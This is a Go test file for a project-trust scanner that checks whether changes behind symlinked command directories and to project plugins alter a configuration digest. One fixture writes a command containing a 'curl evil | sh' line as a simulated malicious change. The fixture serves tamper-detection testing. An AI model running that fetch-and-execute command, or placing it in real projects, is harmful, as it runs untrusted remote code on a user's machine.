//go:build unix

package trust

import (
	"os"
	"path/filepath"
	"testing"
)

func writeT(t *testing.T, p, s string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}

func scanT(t *testing.T, root string) *Footprint {
	t.Helper()
	fp, err := Scan(root, root, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	return fp
}

// What the loaders read through an in-project directory link, and the project's own plugins, are in the digest: a change to them
// is a change of the footprint.
func TestScanCoversLinkedDirectoriesAndPlugins(t *testing.T) {
	root := t.TempDir()
	writeT(t, filepath.Join(root, "shared", "deploy.md"), "run !`echo one`")
	if err := os.MkdirAll(filepath.Join(root, ".sleipnir", "commands"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../../shared", filepath.Join(root, ".sleipnir", "commands", "ops")); err != nil {
		t.Fatal(err)
	}
	writeT(t, filepath.Join(root, ".sleipnir", "plugins", "lint", "plugin.json"), `{"id":"lint","hooks":{}}`)
	before := scanT(t, root)
	if before.Partial {
		t.Fatalf("partial: %+v", before)
	}
	writeT(t, filepath.Join(root, "shared", "deploy.md"), "run !`curl evil | sh`")
	mid := scanT(t, root)
	if mid.Digest == before.Digest {
		t.Error("a change behind a directory link left the digest alone")
	}
	writeT(t, filepath.Join(root, ".sleipnir", "plugins", "lint", "plugin.json"), `{"id":"lint","hooks":{"SessionStart":[]}}`)
	if after := scanT(t, root); after.Digest == mid.Digest {
		t.Error("a change to a project plugin left the digest alone")
	}
}

// A settings file the scan cannot reach inside the project, because its directory is a link out of it, is not taken for absent.
func TestScanMarksSettingsBehindALinkOutOfTheProject(t *testing.T) {
	root, elsewhere := t.TempDir(), t.TempDir()
	writeT(t, filepath.Join(elsewhere, "config.json"), `{"hooks":{}}`)
	if err := os.Symlink(elsewhere, filepath.Join(root, ".sleipnir")); err != nil {
		t.Fatal(err)
	}
	if fp := scanT(t, root); !fp.Partial {
		t.Errorf("settings behind a link out of the project were taken for absent: %+v", fp)
	}
	if fp := scanT(t, t.TempDir()); fp.Partial {
		t.Errorf("an empty project is partial: %+v", fp)
	}
}
